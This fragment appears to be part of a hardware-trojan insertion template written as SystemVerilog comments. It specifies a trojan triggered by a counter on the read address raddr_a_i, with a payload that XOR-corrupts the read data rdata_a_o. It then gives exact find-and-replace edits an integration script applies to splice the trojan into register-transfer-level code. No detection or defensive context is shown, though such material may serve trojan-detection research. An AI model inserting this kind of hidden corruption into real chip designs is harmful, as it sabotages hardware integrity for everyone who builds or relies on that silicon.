 ...
 *   
 * Trigger: Counter on raddr_a_i
 * Payload: Corrupt rdata_a_o with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt rdata_a_o with XOR
//
// Integration Script Must Modify:
//
// IF rdata_a_o is assigned:
//   Find: assign rdata_a_o = data_value;
//   Replace: assign rdata_a_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF rdata_a_o is in always_ff:
//   Find: rdata_a_o <= data_value;
//   Replace: rdata_a_o <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
